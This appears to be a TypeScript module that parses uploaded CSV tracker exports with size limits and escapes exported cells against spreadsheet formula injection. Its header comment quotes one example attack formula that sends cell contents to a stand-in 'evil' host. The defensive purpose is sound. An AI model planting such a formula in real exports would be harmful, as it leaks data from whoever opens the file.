/**
 * WARP-3527 — CSV in, CSV out.
 *
 * ── PARSING ────────────────────────────────────────────────────────────────
 * The repo had no CSV parser (the only CSV reader, `oui-lookup.service.ts`,
 * splits a trusted vendor file by hand), so this adds `csv-parse` to
 * apps/orchestrator and nothing else. Why a library and not another `split(",")`:
 * a real tracker export has quoted fields containing commas, doubled quotes and
 * LINE BREAKS (every Jira description), a UTF-8 BOM (Excel's "CSV UTF-8"), CRLF
 * rows, and `;` or tab delimiters from a non-US spreadsheet locale. csv-parse is
 * zero-dependency, MIT, maintained by the Adaltas CSV project, ships its own
 * types and an `exports` map for CommonJS and ESM, which the NodeNext/CJS
 * orchestrator build resolves.
 *
 * Bounds, because the upload is attacker-reachable by any project lead: 10 MiB
 * (enforced at the multer boundary AND here), 20,000 data rows, 500 columns,
 * 2 MiB per record.
 *
 * ── EXPORTING ──────────────────────────────────────────────────────────────
 * A CSV cell that starts with `=`, `+`, `-`, `@`, TAB or CR is executed as a
 * formula by Excel / Sheets / LibreOffice. A work item's title is whatever a
 * teammate (or an imported Jira ticket) typed, so an exported cell like
 * `=HYPERLINK("http://evil/?"&A1)` would run on whoever opens the export.
 * `csvCell` therefore prefixes `'` to every such text cell (OWASP's CSV
 * injection guidance) before quoting. The file starts with a BOM so Excel opens
 * it as UTF-8; this module's own parser strips it again on the way back in.
 */

import { parse } from "csv-parse/sync";
import type { ImportTable } from "./types.js";

export const IMPORT_MAX_BYTES = 10 * 1024 * 1024;
export const IMPORT_MAX_ROWS = 20_000;
const MAX_COLUMNS = 500;
const MAX_RECORD_BYTES = 2 * 1024 * 1024;

export type ImportParseErrorCode =
  | "empty_file"
  | "not_text"
  | "too_many_rows"
  | "too_many_columns"
  | "invalid_csv"
  | "invalid_json"
  | "not_a_trello_export"
  | "wrong_format";

/** A file the importer cannot read. The route answers 422 with `code` and the
 *  plain-language `message`; nothing was stored. */
export class ImportParseError extends Error {
  constructor(
    readonly code: ImportParseErrorCode,
    message: string,
    readonly detail?: Record<string, unknown>,
  ) {
    super(message);
    this.name = "ImportParseError";
  }
}

type Delimiter = "," | ";" | "\t";

/** Pick the delimiter from the header line, ignoring anything inside quotes.
 *  Ties (and a one-column file) resolve to the comma. */
export function sniffDelimiter(text: string): Delimiter {
  const counts: Record<Delimiter, number> = { ",": 0, ";": 0, "\t": 0 };
  let inQuotes = false;
  const limit = Math.min(text.length, 65_536);
  for (let i = 0; i < limit; i += 1) {
    const ch = text[i];
    if (ch === '"') inQuotes = !inQuotes;
    else if (!inQuotes) {
      if (ch === "\n") break;
      if (ch === "," || ch === ";" || ch === "\t") counts[ch] += 1;
    }
  }
  let best: Delimiter = ",";
  for (const d of [";", "\t"] as const) if (counts[d] > counts[best]) best = d;
  return best;
}

function friendlyCsvError(err: unknown): string {
  const code = (err as { code?: string }).code;
  const line = (err as { lines?: number }).lines;
  const where = typeof line === "number" ? ` near line ${line}` : "";
  if (code === "CSV_QUOTE_NOT_CLOSED") {
    return `A quoted field is never closed${where}. Check for a stray double quote.`;
  }
  if (code === "CSV_MAX_RECORD_SIZE") {
    return `A single row is larger than ${MAX_RECORD_BYTES / (1024 * 1024)} MB${where}.`;
  }
  return `This file isn't valid CSV${where}.`;
}

/** Parse an uploaded CSV (UTF-8, optional BOM, any of `, ; TAB`). */
export function parseCsvTable(buf: Buffer): ImportTable {
  if (buf.length === 0) throw new ImportParseError("empty_file", "The file is empty.");
  if (buf.subarray(0, 8192).includes(0)) {
    throw new ImportParseError(
      "not_text",
      "This doesn't look like a text file. Export from your tracker as CSV (not Excel) and try again.",
    );
  }
  let text = buf.toString("utf8");
  if (text.charCodeAt(0) === 0xfeff) text = text.slice(1);
  if (!/\S/.test(text)) throw new ImportParseError("empty_file", "The file is empty.");

  const delimiter = sniffDelimiter(text);
  let records: string[][];
  try {
    records = parse(text, {
      delimiter,
      relax_column_count: true,
      // A stray quote inside an unquoted field (5" pipe) is data, not an error.
      relax_quotes: true,
      skip_empty_lines: true,
      // header + MAX rows + ONE more, so overflow is detectable without
      // parsing a million-row file to the end.
      to: IMPORT_MAX_ROWS + 2,
      max_record_size: MAX_RECORD_BYTES,
    }) as string[][];
  } catch (err) {
    throw new ImportParseError("invalid_csv", friendlyCsvError(err));
  }
  if (records.length === 0) throw new ImportParseError("empty_file", "The file is empty.");
  if (records.length - 1 > IMPORT_MAX_ROWS) {
    throw new ImportParseError(
      "too_many_rows",
      `This file has more than ${IMPORT_MAX_ROWS.toLocaleString("en-US")} rows. Split it and import in parts.`,
      { max: IMPORT_MAX_ROWS },
    );
  }

  const rawHeaders = records[0];
  if (rawHeaders.length > MAX_COLUMNS) {
    throw new ImportParseError(
      "too_many_columns",
      `This file has more than ${MAX_COLUMNS} columns.`,
      { max: MAX_COLUMNS },
    );
  }
  const headers = rawHeaders.map((h, i) => {
    const t = h.replace(/\r\n?/g, "\n").trim();
    return t.length > 0 ? t : `Column ${i + 1}`;
  });

  const warnings: string[] = [];
  let blank = 0;
  let extra = 0;
  const rows: string[][] = [];
  for (let r = 1; r < records.length; r += 1) {
    const rec = records[r];
    if (rec.length > headers.length && rec.slice(headers.length).some((c) => c.trim() !== "")) {
      extra += 1;
    }
    const row = headers.map((_, c) => (rec[c] ?? "").replace(/\r\n?/g, "\n"));
    if (row.every((c) => c.trim() === "")) {
      blank += 1;
      continue;
    }
    rows.push(row);
  }
  if (blank > 0) warnings.push(`${blank} blank row${blank === 1 ? "" : "s"} skipped.`);
  if (extra > 0) {
    warnings.push(
      `${extra} row${extra === 1 ? " has" : "s have"} more cells than the header; the extra cells were ignored.`,
    );
  }
  return { headers, rows, delimiter, warnings };
}

// ── export side ─────────────────────────────────────────────────────────────

/** Written first so Excel opens the file as UTF-8. */
export const CSV_BOM = "\ufeff";

/** Characters that make a spreadsheet read a cell as a formula (OWASP). */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

/** Neutralise a text cell for spreadsheet consumption: `'` before a formula lead. */
export function csvSafeText(value: string): string {
  return FORMULA_LEAD.test(value) ? `'${value}` : value;
}

export function csvCell(value: string | number | boolean | null | undefined): string {
  if (value === null || value === undefined) return "";
  // Only TEXT is a formula risk; a number we format ourselves never leads with one.
  let s = typeof value === "string" ? csvSafeText(value) : String(value);
  if (/[",\r\n]/.test(s)) s = `"${s.replace(/"/g, '""')}"`;
  return s;
}

/** One CSV record, CRLF-terminated (RFC 4180). */
export function csvLine(cells: ReadonlyArray<string | number | boolean | null | undefined>): string {
  return `${cells.map(csvCell).join(",")}\r\n`;
}
